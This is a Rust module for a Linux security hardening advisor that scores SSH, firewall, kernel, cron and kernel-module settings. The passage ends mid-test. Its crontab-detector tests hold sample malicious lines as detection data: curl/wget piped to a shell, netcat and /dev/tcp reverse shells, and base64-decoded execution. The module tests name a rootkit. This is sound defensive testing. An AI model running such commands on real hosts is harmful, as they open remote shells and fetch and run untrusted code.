//! System hardening advisor - scans configuration and suggests improvements.
//!
//! `innerwarden harden` reads system files, evaluates security posture,
//! and prints actionable recommendations. Never applies changes automatically.

mod auditd;
mod crontabs;
mod docker;
mod env;
mod firewall;
mod firmware;
mod ignore;
mod kernel;
mod kernel_hardening;
mod kernel_modules;
mod mac;
mod permissions;
mod services;
mod ssh;
mod tls;
mod types;
mod updates;

use std::collections::HashSet;
use std::io::{self, Write};
use std::path::Path;

use anyhow::Result;
use auditd::check_auditd;
use crontabs::check_crontabs;
use docker::check_docker;
use env::{HardenEnv, RealHardenEnv};
use firewall::check_firewall;
use firmware::check_firmware;
use ignore::{is_ignored, load_ignore_list};
use kernel::check_kernel;
use kernel_hardening::check_kernel_hardening;
use kernel_modules::check_kernel_modules;
use mac::check_mac;
use permissions::check_permissions;
use services::check_services;
use ssh::check_ssh;
use tls::check_tls;
use types::CheckResult;
use updates::check_updates;

#[cfg(test)]
use crontabs::suspicious_crontab_reason;
#[cfg(test)]
use firewall::{
    firewalld_zone_is_recommended, risky_open_services, ufw_default_is_deny_incoming, ufw_is_active,
};
#[cfg(test)]
use kernel::evaluate_kernel_sysctl_values;
#[cfg(test)]
use kernel_modules::classify_loaded_modules;
#[cfg(test)]
use services::{exposed_service_lines, is_service_exposure_line_safe};
#[cfg(test)]
use ssh::{evaluate_ssh_config, ssh_config_value};
#[cfg(test)]
use tls::{check_tls_apache_files, check_tls_nginx_files, check_tls_openssl_content};
#[cfg(test)]
use types::Severity;

pub fn cmd_harden(verbose: bool) -> Result<()> {
    let ignore_path = Path::new("/etc/innerwarden/harden-ignore.toml");
    let mut out = io::stdout();
    cmd_harden_with_env(verbose, &RealHardenEnv, ignore_path, &mut out)
}

fn cmd_harden_with_env<W: Write>(
    verbose: bool,
    env: &impl HardenEnv,
    ignore_path: &Path,
    out: &mut W,
) -> Result<()> {
    writeln!(out)?;
    writeln!(
        out,
        "  \x1b[1m\x1b[36mInner Warden - Security Hardening Advisor\x1b[0m"
    )?;
    writeln!(out, "  \x1b[90mScanning system configuration...\x1b[0m")?;

    let ignore_list = load_ignore_list(ignore_path);
    if !ignore_list.is_empty() {
        writeln!(
            out,
            "  \x1b[90m{} accepted risk(s) loaded from {}\x1b[0m",
            ignore_list.len(),
            ignore_path.display()
        )?;
    }
    writeln!(out)?;

    let checks = run_checks(env);
    render_report(out, verbose, &checks, &ignore_list)?;

    Ok(())
}

fn render_report<W: Write>(
    out: &mut W,
    verbose: bool,
    checks: &[CheckResult],
    ignore_list: &HashSet<String>,
) -> io::Result<()> {
    let mut total_findings = 0;
    let mut total_passed = 0;
    let mut score: u32 = 100;

    for result in checks {
        let n_findings_real = result
            .findings
            .iter()
            .filter(|f| !is_ignored(&f.title, ignore_list))
            .count();
        let n_passed = result.passed.len();
        total_findings += n_findings_real;
        total_passed += n_passed;

        // Category header
        let status = if n_findings_real == 0 {
            "\x1b[32m✓\x1b[0m"
        } else {
            "\x1b[33m!\x1b[0m"
        };
        writeln!(out, "  {} \x1b[1m{}\x1b[0m", status, result.category)?;

        // Passed items (verbose only)
        if verbose {
            for p in &result.passed {
                writeln!(out, "    \x1b[32m✓\x1b[0m {}", p)?;
            }
        }

        // Findings
        let mut ignored_count = 0usize;
        for f in &result.findings {
            if is_ignored(&f.title, ignore_list) {
                ignored_count += 1;
                if verbose {
                    writeln!(out, "    \x1b[90m⊘  {} [accepted risk]\x1b[0m", f.title)?;
                }
                continue;
            }
            score = score.saturating_sub(f.severity.score_penalty());
            writeln!(
                out,
                "    {}  {} \x1b[90m[{}]\x1b[0m",
                f.severity.icon(),
                f.title,
                f.severity.label()
            )?;
            writeln!(out, "       \x1b[90m→\x1b[0m \x1b[36m{}\x1b[0m", f.fix)?;
        }
        if ignored_count > 0 && !verbose {
            writeln!(
                out,
                "    \x1b[90m{} accepted risk(s) hidden\x1b[0m",
                ignored_count
            )?;
        }

        if n_findings_real == 0 && !verbose {
            writeln!(out, "    \x1b[32m{} check(s) passed\x1b[0m", n_passed)?;
        }

        writeln!(out)?;
    }

    // Score bar
    let bar_width = 30;
    let filled = (score as usize * bar_width) / 100;
    let bar_color = if score >= 80 {
        "\x1b[32m"
    } else if score >= 50 {
        "\x1b[33m"
    } else {
        "\x1b[31m"
    };
    let bar = format!(
        "{}{}{}",
        bar_color,
        "█".repeat(filled),
        "\x1b[90m░\x1b[0m".repeat(bar_width - filled)
    );

    let grade = match score {
        90..=100 => "\x1b[32mExcellent\x1b[0m",
        75..=89 => "\x1b[32mGood\x1b[0m",
        50..=74 => "\x1b[33mFair\x1b[0m",
        25..=49 => "\x1b[91mPoor\x1b[0m",
        _ => "\x1b[31mCritical\x1b[0m",
    };

    writeln!(
        out,
        "  \x1b[1mScore:\x1b[0m {}{}\x1b[0m/100 - {}",
        bar_color, score, grade
    )?;
    writeln!(out, "  {}", bar)?;
    writeln!(out)?;
    writeln!(
        out,
        "  \x1b[90m{} passed · {} finding(s)\x1b[0m",
        total_passed, total_findings
    )?;

    if total_findings == 0 {
        writeln!(
            out,
            "\n  \x1b[32m\x1b[1mYour system is well hardened. Nice work!\x1b[0m\n"
        )?;
    } else {
        writeln!(
            out,
            "\n  \x1b[90mRun with --verbose to see all passed checks.\x1b[0m"
        )?;
        writeln!(
            out,
            "  \x1b[90mInner Warden only advises - no changes are applied automatically.\x1b[0m\n"
        )?;
    }

    Ok(())
}

fn run_checks(env: &impl HardenEnv) -> Vec<CheckResult> {
    vec![
        check_ssh(env),
        check_firewall(env),
        check_kernel(env),
        check_kernel_hardening(env),
        check_mac(env),
        check_permissions(env),
        check_updates(env),
        check_docker(env),
        check_services(env),
        check_crontabs(env),
        check_kernel_modules(env),
        check_tls(env),
        check_firmware(env),
        check_auditd(env),
    ]
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use std::collections::{HashMap, HashSet};
    use std::fs;

    #[cfg(unix)]
    use std::os::unix::fs::PermissionsExt;

    use super::env::DirEntry;
    use super::*;

    #[derive(Default)]
    struct TestEnv {
        files: HashMap<String, String>,
        bytes: HashMap<String, Vec<u8>>,
        dirs: HashMap<String, Vec<DirEntry>>,
        modes: HashMap<String, u32>,
        paths: HashSet<String>,
        commands: HashMap<(String, Vec<String>), String>,
    }

    impl TestEnv {
        fn with_file(mut self, path: &str, content: &str) -> Self {
            self.files.insert(path.to_string(), content.to_string());
            self.paths.insert(path.to_string());
            self
        }

        fn with_bytes(mut self, path: &str, content: Vec<u8>) -> Self {
            self.bytes.insert(path.to_string(), content);
            self.paths.insert(path.to_string());
            self
        }

        fn with_dir(mut self, path: &str, entries: Vec<DirEntry>) -> Self {
            self.dirs.insert(path.to_string(), entries);
            self.paths.insert(path.to_string());
            self
        }

        fn with_mode(mut self, path: &str, mode: u32) -> Self {
            self.modes.insert(path.to_string(), mode);
            self.paths.insert(path.to_string());
            self
        }

        fn with_path(mut self, path: &str) -> Self {
            self.paths.insert(path.to_string());
            self
        }

        fn with_command(mut self, program: &str, args: &[&str], stdout: &str) -> Self {
            self.commands.insert(
                (
                    program.to_string(),
                    args.iter().map(|arg| (*arg).to_string()).collect(),
                ),
                stdout.to_string(),
            );
            self
        }
    }

    impl HardenEnv for TestEnv {
        fn read_to_string(&self, path: &str) -> Option<String> {
            self.files.get(path).cloned()
        }

        fn read_bytes(&self, path: &str) -> Option<Vec<u8>> {
            self.bytes.get(path).cloned()
        }

        fn read_dir(&self, path: &str) -> Vec<DirEntry> {
            self.dirs.get(path).cloned().unwrap_or_default()
        }

        fn metadata_mode(&self, path: &str) -> Option<u32> {
            self.modes.get(path).copied()
        }

        fn path_exists(&self, path: &str) -> bool {
            self.paths.contains(path)
        }

        fn command_stdout(&self, program: &str, args: &[&str]) -> Option<String> {
            self.commands
                .get(&(
                    program.to_string(),
                    args.iter().map(|arg| (*arg).to_string()).collect(),
                ))
                .cloned()
        }
    }

    fn file_entry(path: &str) -> DirEntry {
        DirEntry {
            path: path.to_string(),
            is_file: true,
            is_dir: false,
        }
    }

    fn dir_entry(path: &str) -> DirEntry {
        DirEntry {
            path: path.to_string(),
            is_file: false,
            is_dir: true,
        }
    }

    fn has_title(result: &types::CheckResult, needle: &str) -> bool {
        result
            .findings
            .iter()
            .any(|finding| finding.title.contains(needle))
    }

    fn test_finding(severity: Severity, title: &str) -> types::Finding {
        types::Finding {
            category: "Test",
            severity,
            title: title.to_string(),
            fix: "fix it".to_string(),
        }
    }

    fn test_result(passed: Vec<&str>, findings: Vec<types::Finding>) -> CheckResult {
        CheckResult {
            category: "Test",
            passed: passed.into_iter().map(str::to_string).collect(),
            findings,
        }
    }

    #[test]
    fn load_ignore_list_returns_empty_when_file_is_missing() {
        // Exercises missing-file path so harden ignore loading stays fail-safe.
        let path = Path::new("/tmp/innerwarden-definitely-missing-ignore.toml");
        let ignore = load_ignore_list(path);
        assert!(ignore.is_empty());
    }

    #[test]
    fn load_ignore_list_parses_valid_file_and_falls_back_on_invalid_toml() {
        let dir = tempfile::tempdir().expect("tempdir");
        let valid_path = dir.path().join("ignore.toml");
        fs::write(&valid_path, "ignore = [\"ASLR\", \"docker\"]\n").unwrap();
        let parsed = load_ignore_list(&valid_path);
        assert!(parsed.contains("ASLR"));
        assert!(parsed.contains("docker"));

        let invalid_path = dir.path().join("invalid.toml");
        fs::write(&invalid_path, "ignore = [").unwrap();
        assert!(load_ignore_list(&invalid_path).is_empty());
    }

    #[test]
    fn is_ignored_matches_case_insensitive_substrings() {
        // Verifies ignore matching is case-insensitive and uses substring semantics.
        let mut ignore = HashSet::new();
        ignore.insert("IP forwarding".to_string());
        assert!(is_ignored("Warning: ip FORWARDING is enabled", &ignore));
        assert!(!is_ignored("Kernel ASLR fully enabled", &ignore));
    }

    #[test]
    fn severity_score_penalty_tracks_risk_levels() {
        // Guards scoring weights so harder findings always penalize more than soft ones.
        assert_eq!(Severity::Info.score_penalty(), 0);
        assert_eq!(Severity::Low.score_penalty(), 2);
        assert_eq!(Severity::Medium.score_penalty(), 5);
        assert_eq!(Severity::High.score_penalty(), 10);
        assert_eq!(Severity::Critical.score_penalty(), 20);
    }

    #[test]
    fn severity_icons_and_labels_cover_all_levels() {
        assert!(Severity::Info.icon().contains("\x1b[36m"));
        assert_eq!(Severity::Info.label(), "info");
        assert_eq!(Severity::Low.label(), "low");
        assert_eq!(Severity::Medium.label(), "medium");
        assert_eq!(Severity::High.label(), "high");
        assert_eq!(Severity::Critical.label(), "critical");
    }

    #[test]
    fn ssh_config_value_returns_first_directive_and_ignores_comments() {
        // OpenSSH `sshd_config(5)`: "the first obtained value will be
        // used". Anti-regression for assuming shell-style "last wins"
        // semantics - that would silently neutralise a hardened
        // drop-in fragment whose value sits LATER in the concatenated
        // config, while a stale insecure value at the top wins. The
        // commented line must be skipped; the lowercase variant must
        // still match (case-insensitive directive names).
        let config = r#"
            # PasswordAuthentication yes
            passwordauthentication no
            PasswordAuthentication yes
        "#;
        assert_eq!(
            ssh_config_value(config, "PasswordAuthentication")
                .expect("directive should be present"),
            "no",
            "OpenSSH first-value-wins: the lowercase 'no' line precedes \
             the 'yes' line, so it must win"
        );
    }

    #[test]
    fn ssh_config_value_returns_none_for_missing_directive() {
        // Ensures missing directives remain None so caller logic can apply defaults safely.
        let config = "Port 2222\n";
        assert!(ssh_config_value(config, "PermitRootLogin").is_none());
    }

    #[test]
    fn check_ssh_reads_config_fragments_after_base_config() {
        let env = TestEnv::default()
            .with_file(
                "/etc/ssh/sshd_config",
                "PasswordAuthentication yes\nPermitRootLogin yes\nPort 22\nMaxAuthTries 6\n",
            )
            .with_dir(
                "/etc/ssh/sshd_config.d",
                vec![file_entry("/etc/ssh/sshd_config.d/99-hardening.conf")],
            )
            .with_file(
                "/etc/ssh/sshd_config.d/99-hardening.conf",
                "PasswordAuthentication no\nPermitRootLogin prohibit-password\nPort 2200\nMaxAuthTries 2\nPermitEmptyPasswords no\n",
            );

        let result = check_ssh(&env);

        assert!(result.findings.is_empty());
        assert!(result
            .passed
            .iter()
            .any(|passed| passed.contains("non-standard port")));
    }

    #[test]
    fn evaluate_ssh_config_hardened_profile_has_no_findings() {
        // Validates happy path for hardened SSH policy across all evaluated directives.
        let config = r#"
            PasswordAuthentication no
            PermitRootLogin no
            Port 2222
            MaxAuthTries 3
            PermitEmptyPasswords no
        "#;
        let (_passed, findings) = evaluate_ssh_config(config, "SSH");
        assert!(findings.is_empty());
    }

    #[test]
    fn evaluate_ssh_config_insecure_profile_flags_high_and_critical_findings() {
        // Exercises insecure defaults to ensure each branch emits the expected hardening findings.
        let config = r#"
            PasswordAuthentication yes
            PermitRootLogin yes
            Port 22
            MaxAuthTries 8
            PermitEmptyPasswords yes
        "#;
        let (_passed, findings) = evaluate_ssh_config(config, "SSH");
        assert!(findings
            .iter()
            .any(|f| f.title.contains("Password authentication")));
        assert!(findings
            .iter()
            .any(|f| f.title.contains("Root login via SSH")));
        assert!(findings.iter().any(|f| f.title.contains("Empty passwords")));
    }

    #[test]
    fn firewalld_zone_recommendation_accepts_expected_zones() {
        // Guards allowed-zone list used when evaluating firewalld defaults.
        assert!(firewalld_zone_is_recommended("drop"));
        assert!(firewalld_zone_is_recommended("block"));
        assert!(firewalld_zone_is_recommended("public"));
    }

    #[test]
    fn firewalld_zone_recommendation_rejects_other_zones() {
        // Confirms non-recommended default zones trigger findings in firewall checks.
        assert!(!firewalld_zone_is_recommended("home"));
        assert!(!firewalld_zone_is_recommended("trusted"));
    }

    #[test]
    fn ufw_status_helpers_parse_active_and_default_policy() {
        // Ensures UFW text parsing keeps the active-state and deny-policy decisions stable.
        let status = "Status: active\nDefault: deny (incoming), allow (outgoing)";
        assert!(ufw_is_active(status));
        assert!(ufw_default_is_deny_incoming(status));
    }

    #[test]
    fn risky_open_services_flags_database_ports_on_wildcard_bind() {
        // Covers risky-port detection path used to flag services exposed on all interfaces.
        let ss = "LISTEN 0 128 0.0.0.0:3306 users:(\"mysqld\")\n\
LISTEN 0 128 0.0.0.0:6379 users:(\"redis\")\n";
        let services = risky_open_services(ss);
        assert!(services.contains(&"MySQL"));
        assert!(services.contains(&"Redis"));
    }

    #[test]
    fn risky_open_services_ignores_localhost_only_binds() {
        // Verifies risky-port scanner does not flag localhost-only listeners.
        let ss = "LISTEN 0 128 127.0.0.1:3306\nLISTEN 0 128 127.0.0.1:6379\n";
        let services = risky_open_services(ss);
        assert!(services.is_empty());
    }

    #[test]
    fn check_firewall_reports_firewalld_zone_and_risky_wildcard_ports() {
        let env = TestEnv::default()
            .with_command("firewall-cmd", &["--state"], "running\n")
            .with_command("firewall-cmd", &["--get-default-zone"], "home\n")
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:5432 users:(\"postgres\")\n",
            );

        let result = check_firewall(&env);

        assert!(result
            .passed
            .iter()
            .any(|passed| passed == "firewalld is active"));
        assert!(has_title(&result, "Default firewalld zone"));
        assert!(has_title(
            &result,
            "PostgreSQL is listening on all interfaces"
        ));
    }

    #[test]
    fn check_firewall_covers_ufw_and_iptables_paths() {
        let firewalld_ok = TestEnv::default()
            .with_command("firewall-cmd", &["--state"], "running\n")
            .with_command("firewall-cmd", &["--get-default-zone"], "public\n")
            .with_command("ss", &["-tlnp"], "");
        let firewalld_ok_result = check_firewall(&firewalld_ok);
        assert!(firewalld_ok_result
            .passed
            .iter()
            .any(|passed| passed == "Default zone: public"));

        let firewalld_without_zone = TestEnv::default()
            .with_command("firewall-cmd", &["--state"], "running\n")
            .with_command("ss", &["-tlnp"], "");
        let firewalld_without_zone_result = check_firewall(&firewalld_without_zone);
        assert!(firewalld_without_zone_result
            .passed
            .iter()
            .any(|passed| passed == "firewalld is active"));

        let ufw_env = TestEnv::default()
            .with_command(
                "sudo",
                &["ufw", "status", "verbose"],
                "Status: active\nDefault: allow (incoming), allow (outgoing)\n",
            )
            .with_command("ss", &["-tlnp"], "");
        let ufw_result = check_firewall(&ufw_env);
        assert!(has_title(&ufw_result, "Default incoming policy"));

        let hardened_ufw = TestEnv::default()
            .with_command(
                "sudo",
                &["ufw", "status", "verbose"],
                "Status: active\nDefault: deny (incoming), allow (outgoing)\n",
            )
            .with_command("ss", &["-tlnp"], "");
        let hardened_ufw_result = check_firewall(&hardened_ufw);
        assert!(hardened_ufw_result
            .passed
            .iter()
            .any(|passed| passed == "Default incoming policy: deny"));

        let ufw_inactive_env = TestEnv::default()
            .with_command("sudo", &["ufw", "status", "verbose"], "Status: inactive\n")
            .with_command("ss", &["-tlnp"], "");
        let ufw_inactive_result = check_firewall(&ufw_inactive_env);
        assert!(has_title(
            &ufw_inactive_result,
            "Firewall (UFW) is not active"
        ));

        let iptables_env = TestEnv::default()
            .with_command(
                "iptables",
                &["-L", "-n"],
                "Chain INPUT\nrule1\nrule2\nrule3\nrule4\nrule5\n",
            )
            .with_command("ss", &["-tlnp"], "");
        let iptables_result = check_firewall(&iptables_env);
        assert!(iptables_result
            .passed
            .iter()
            .any(|passed| passed == "iptables rules configured"));

        let sparse_iptables_env = TestEnv::default()
            .with_command("iptables", &["-L", "-n"], "Chain INPUT\n")
            .with_command("ss", &["-tlnp"], "");
        let sparse_iptables_result = check_firewall(&sparse_iptables_env);
        assert!(has_title(
            &sparse_iptables_result,
            "No firewall rules detected"
        ));

        let missing_env = TestEnv::default();
        let missing_result = check_firewall(&missing_env);
        assert!(has_title(&missing_result, "No firewall detected"));
    }

    #[test]
    fn evaluate_kernel_sysctl_values_hardened_profile_passes() {
        // Exercises fully hardened sysctl combination to ensure no false-positive findings.
        let (_passed, findings) = evaluate_kernel_sysctl_values(
            Some("2"),
            Some("1"),
            Some("0"),
            Some("0"),
            Some("0"),
            "Kernel",
        );
        assert!(findings.is_empty());
    }

    #[test]
    fn evaluate_kernel_sysctl_values_unhardened_profile_reports_expected_risks() {
        // Covers degraded sysctl combinations and verifies risk severities are emitted.
        let (_passed, findings) = evaluate_kernel_sysctl_values(
            Some("0"),
            Some("0"),
            Some("1"),
            Some("1"),
            Some("1"),
            "Kernel",
        );
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.title.contains("ASLR")));
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::Low && f.title.contains("IP forwarding")));
        assert!(findings.iter().any(|f| f.title.contains("Source routing")));
    }

    #[test]
    fn check_kernel_reads_sysctl_values_from_environment() {
        let env = TestEnv::default()
            .with_file("/proc/sys/kernel/randomize_va_space", "2\n")
            .with_file("/proc/sys/net/ipv4/tcp_syncookies", "1\n")
            .with_file("/proc/sys/net/ipv4/ip_forward", "0\n")
            .with_file("/proc/sys/net/ipv4/conf/all/accept_redirects", "0\n")
            .with_file("/proc/sys/net/ipv4/conf/all/accept_source_route", "0\n");

        let result = check_kernel(&env);

        assert!(result.findings.is_empty());
        assert!(result
            .passed
            .iter()
            .any(|passed| passed == "ASLR fully enabled"));
    }

    #[test]
    fn is_service_exposure_line_safe_whitelists_expected_ports_and_processes() {
        // Ensures known-safe listeners do not inflate exposure finding counts.
        assert!(is_service_exposure_line_safe(
            "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")"
        ));
        assert!(is_service_exposure_line_safe(
            "LISTEN 0 128 0.0.0.0:8787 users:(\"innerwarden-agent\")"
        ));
        assert!(is_service_exposure_line_safe(
            "LISTEN 0 128 :::443 users:(\"nginx\")"
        ));
    }

    #[test]
    fn exposed_service_lines_returns_only_unusual_exposures() {
        // Verifies service exposure filtering keeps suspicious wildcard listeners while dropping safe ones.
        let ss = "\
LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n\
LISTEN 0 128 0.0.0.0:5000 users:(\"python\")\n\
LISTEN 0 128 :::3307 users:(\"custom\")\n\
";
        let exposed = exposed_service_lines(ss);
        assert_eq!(exposed.len(), 2);
        assert!(exposed.iter().any(|line| line.contains(":5000")));
        assert!(exposed.iter().any(|line| line.contains(":3307")));
    }

    #[test]
    fn check_services_reports_exposure_pressure_and_agent_state() {
        let exposed = (4000..4006)
            .map(|port| format!("LISTEN 0 128 0.0.0.0:{port} users:(\"svc\")"))
            .collect::<Vec<_>>()
            .join("\n");
        let env = TestEnv::default()
            .with_command("ss", &["-tlnp"], &exposed)
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-agent"],
                "inactive\n",
            );

        let result = check_services(&env);

        assert!(has_title(&result, "services exposed on all interfaces"));
        assert!(has_title(&result, "Inner Warden agent is not running"));

        let healthy_env = TestEnv::default()
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n",
            )
            .with_command("systemctl", &["is-active", "innerwarden-agent"], "active\n");
        let healthy = check_services(&healthy_env);
        assert!(healthy.findings.is_empty());
        assert!(healthy
            .passed
            .iter()
            .any(|passed| passed == "Inner Warden agent is active"));
    }

    /// 2026-05-09 prod anchor: on the proprietary watchdog setup the
    /// agent runs as a child of `innerwarden-watchdog.service` and the
    /// `innerwarden-agent.service` unit is intentionally disabled, so
    /// `systemctl is-active innerwarden-agent` returns `inactive` while
    /// the agent process is alive. Pre-fix the operator's prod harden
    /// emitted "Inner Warden agent is not running [medium]" while
    /// pid 868514 was processing events. The fix: when systemctl says
    /// the agent unit is inactive, also check whether the watchdog is
    /// active AND a process named `innerwarden-age` is visible to
    /// pgrep. If both, classify as Active and emit the passed line.
    #[test]
    fn check_services_active_when_watchdog_runs_agent_under_disabled_unit() {
        let env = TestEnv::default()
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n",
            )
            // Disabled / inactive unit because watchdog manages the
            // process directly.
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-agent"],
                "inactive\n",
            )
            // Watchdog itself is the active service.
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-watchdog"],
                "active\n",
            )
            // pgrep finds the agent process (Linux truncates the comm
            // to 15 chars, so `innerwarden-age` is what `pgrep -x`
            // matches).
            .with_command("pgrep", &["-x", "innerwarden-age"], "868514\n");

        let result = check_services(&env);

        assert!(
            !has_title(&result, "Inner Warden agent is not running"),
            "2026-05-09 prod regression: harden must not claim the agent \
             is down when the watchdog is running it"
        );
        assert!(
            result
                .passed
                .iter()
                .any(|p| p == "Inner Warden agent is active"),
            "watchdog-running case must emit the same passed line as a \
             plain systemd-active case"
        );
    }

    /// Counter-test: when both systemctl (agent unit) AND the watchdog
    /// say nothing is running AND no agent process is visible, the
    /// finding is correct and must still fire. Anchors that the
    /// watchdog promote-to-Active logic does not silently swallow
    /// genuine "agent down" cases.
    #[test]
    fn check_services_finding_when_neither_systemd_nor_watchdog_runs_agent() {
        let env = TestEnv::default()
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n",
            )
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-agent"],
                "inactive\n",
            )
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-watchdog"],
                "inactive\n",
            )
            .with_command("pgrep", &["-x", "innerwarden-age"], "");

        let result = check_services(&env);

        assert!(
            has_title(&result, "Inner Warden agent is not running"),
            "agent genuinely down → finding must fire"
        );
    }

    /// Bug 8 anchor (2026-05-06): when the operator's session lacks
    /// `DBUS_SESSION_BUS_ADDRESS`, `systemctl is-active` prints
    /// `unknown` to stdout while the agent is in fact alive. Harden
    /// MUST NOT emit "Inner Warden agent is not running" in that
    /// case — the observed effect was a 16/100 "Critical" score
    /// driven partly by this false-positive while the agent was up.
    /// Anchor the silence: no finding, no passed line, no false signal.
    #[test]
    fn check_services_silent_when_systemctl_returns_unknown() {
        let env = TestEnv::default()
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n",
            )
            .with_command(
                "systemctl",
                &["is-active", "innerwarden-agent"],
                "unknown\n",
            );

        let result = check_services(&env);

        assert!(
            !has_title(&result, "Inner Warden agent is not running"),
            "Bug 8 regression: harden must not claim the agent is down on a bus-failure shape"
        );
        assert!(
            !result
                .passed
                .iter()
                .any(|passed| passed == "Inner Warden agent is active"),
            "Bug 8: harden also must not claim the agent IS active when the bus is unreachable — defer to doctor's freshness check"
        );
    }

    /// Bug 8 anchor: same rule when stdout is empty (the bus-failure
    /// shape on some distros — the bus error goes to stderr, stdout
    /// is empty, exit non-zero). The classifier returns Unknown so
    /// no finding fires.
    #[test]
    fn check_services_silent_when_systemctl_stdout_is_empty() {
        let env = TestEnv::default()
            .with_command(
                "ss",
                &["-tlnp"],
                "LISTEN 0 128 0.0.0.0:22 users:(\"sshd\")\n",
            )
            .with_command("systemctl", &["is-active", "innerwarden-agent"], "");

        let result = check_services(&env);

        assert!(!has_title(&result, "Inner Warden agent is not running"));
        assert!(!result
            .passed
            .iter()
            .any(|passed| passed == "Inner Warden agent is active"));
    }

    #[test]
    fn suspicious_crontab_reason_detects_download_execute_patterns() {
        // Exercises malware-stager detection for curl/wget piped into shell interpreters.
        assert!(suspicious_crontab_reason("*/5 * * * * curl http://x | sh").is_some());
        assert!(suspicious_crontab_reason("*/5 * * * * wget http://x |bash").is_some());
    }

    #[test]
    fn suspicious_crontab_reason_detects_reverse_shell_patterns() {
        // Ensures reverse-shell indicators remain classified as suspicious cron activity.
        assert!(suspicious_crontab_reason("* * * * * nc -e /bin/sh 1.2.3.4 4444").is_some());
        assert!(
            suspicious_crontab_reason("* * * * * bash -c 'cat </dev/tcp/1.2.3.4/4444'").is_some()
        );
    }

    #[test]
    fn suspicious_crontab_reason_detects_obfuscation_and_tmp_staging() {
        // Covers obfuscation and tmp-write patterns that should trigger manual review findings.
        assert!(suspicious_crontab_reason("* * * * * echo abc | base64 -d | sh").is_some());
        assert!(suspicious_crontab_reason("* * * * * echo hi > /tmp/p.sh").is_some());
    }

    #[test]
    fn suspicious_crontab_reason_ignores_comments_and_benign_lines() {
        // Confirms parser skips comments/blank lines and does not flag normal maintenance jobs.
        assert_eq!(suspicious_crontab_reason("# comment"), None);
        assert_eq!(suspicious_crontab_reason(""), None);
        assert_eq!(
            suspicious_crontab_reason("0 3 * * * /usr/bin/find /var/log -type f -mtime +7 -delete"),
            None
        );
    }

    #[test]
    fn check_crontabs_scans_spool_crond_and_system_crontab() {
        let env = TestEnv::default()
            .with_dir(
                "/var/spool/cron/crontabs",
                vec![
                    file_entry("/var/spool/cron/crontabs/root"),
                    dir_entry("/var/spool/cron/crontabs/ignored-dir"),
                ],
            )
            .with_file(
                "/var/spool/cron/crontabs/root",
                "* * * * * curl http://x | sh\n",
            )
            .with_dir("/etc/cron.d", vec![file_entry("/etc/cron.d/backup")])
            .with_file("/etc/cron.d/backup", "0 1 * * * root /usr/bin/true\n")
            .with_file("/etc/crontab", "* * * * * root echo abc | base64 -d\n");

        let result = check_crontabs(&env);

        assert!(has_title(&result, "/var/spool/cron/crontabs/root:1"));
        assert!(has_title(&result, "/etc/crontab:1"));

        let empty = check_crontabs(&TestEnv::default());
        assert!(empty
            .passed
            .iter()
            .any(|passed| passed == "No crontab files found to scan"));

        let benign = TestEnv::default()
            .with_dir("/etc/cron.d", vec![file_entry("/etc/cron.d/backup")])
            .with_file("/etc/cron.d/backup", "0 1 * * * root /usr/bin/true\n");
        let benign_result = check_crontabs(&benign);
        assert!(benign_result
            .passed
            .iter()
            .any(|passed| passed.contains("Scanned 1 crontab file")));

        let unreadable =
            TestEnv::default().with_dir("/etc/cron.d", vec![file_entry("/etc/cron.d/unreadable")]);
        let unreadable_result = check_crontabs(&unreadable);
        assert!(unreadable_result
            .passed
            .iter()
            .any(|passed| passed == "No crontab files found to scan"));
    }

    #[test]
    fn classify_loaded_modules_flags_rootkits_and_unknown_modules() {
        // Validates rootkit matching and unknown-module bucketing from lsmod text parsing.
        let output = "\
Module                  Size  Used by\n\
diamorphine            16384  0\n\
mystery_mod            20480  0\n\
ext4                  999999  1\n\
";
        let (rootkits, unknowns) = classify_loaded_modules(output, &["diamorphine"], &["ext4"]);
        assert_eq!(rootkits, vec!["diamorphine"]);
        assert_eq!(unknowns, vec!["mystery_mod"]);
    }

    #[test]
    fn classify_loaded_modules_ignores_known_good_entries() {
        // Ensures known-good modules are not misclassified as unusual.
        let output = "\
Module                  Size  Used by\n\
ext4                  999999  1\n\
nf_tables             123456  2\n\
";
        let (rootkits, unknowns) =
            classify_loaded_modules(output, &["diamorphine"], &["ext4", "nf_tables"]);
        assert!(rootkits.is_empty());
        assert!(unknowns.is_empty());
    }

    #[test]
    fn classify_loaded_modules_skips_blank_rows() {
        let output = "Module Size Used by\n\next4 1 0\n";
        let (rootkits, unknowns) = classify_loaded_modules(output, &["diamorphine"], &["ext4"]);
        assert!(rootkits.is_empty());
        assert!(unknowns.is_empty());
    }

    #[test]
    fn check_kernel_modules_reports_rootkits_unknowns_and_missing_lsmod() {
        let env = TestEnv::default().with_command(
            "lsmod",
            &[],
            "Module Size Used by\ndiamorphine 1 0\nmystery_mod 1 0\next4 1 0\n",
        );
        let result = check_kernel_modules(&env);
        assert!(has_title(&result, "Known rootkit module loaded"));
        assert!(has_title(&result, "unusual kernel module"));

        let missing = check_kernel_modules(&TestEnv::default());
        assert!(missing
            .passed
            .iter()
            .any(|passed| passed == "lsmod not available (skipped)"));

        let known_good =
            TestEnv::default().with_command("lsmod", &[], "Module Size Used by\next4 1 0\n");
        let known_good_result = check_kernel_modules(&known_good);
        assert!(known_good_result.findings.is_empty());
        assert!(known_good_result
            .passed
            .iter()
            .any(|passed| passed == "All loaded kernel modules are known-good"));
    }

    // --- Nginx tests --------------------------------------------------------

    #[test]
    fn nginx_good_config_passes() {
        let files = vec![(
            "nginx.conf".to_string(),
            r#"
ssl_protocols TLSv1.2 TLSv1.3;
